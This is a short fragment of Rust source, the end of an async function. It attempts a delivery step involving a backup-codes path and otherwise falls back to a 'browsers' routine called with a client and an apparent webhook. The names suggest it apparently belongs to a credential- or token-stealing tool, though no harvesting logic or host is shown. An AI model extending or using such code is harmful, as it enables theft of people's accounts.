                                                                backup_codes_path.as_deref(),
                                                            )
                                                            .await
                                                            {
                                                                log_runtime_error(error.as_ref());
                                                            } else {
                                                                delivered_with_token = true;
                                                            }
                                                        }
                                                    }
                                                }
                                            }
                                        }
                                    }
                                }
                            }
                        }
                    }
                }
            }
        }
    }

    if !delivered_with_token {
        if let Err(error) = browsers::run(&client, &wbh).await {
            log_runtime_error(error.as_ref());
        }
    }
    Ok(())
}
